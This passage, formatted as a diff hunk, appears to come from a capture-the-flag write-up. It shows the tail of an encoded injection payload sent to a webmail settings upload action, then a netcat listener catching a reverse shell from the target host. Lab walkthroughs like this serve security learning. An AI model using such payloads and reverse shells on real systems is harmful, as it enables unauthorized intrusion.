@@ -1,0 +1,1 @@
+22%C0%3B%C0%7D%C0%7D%C0&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload ### Payload injected successfully ### Executing payload... It works: oxdf@hacky$ nc -lnvp 443 Listening on 0.0.0.0 443 Connection received on 10.10.11.54 49856 bash: cannot set terminal process group (507): Inappropriate ioctl
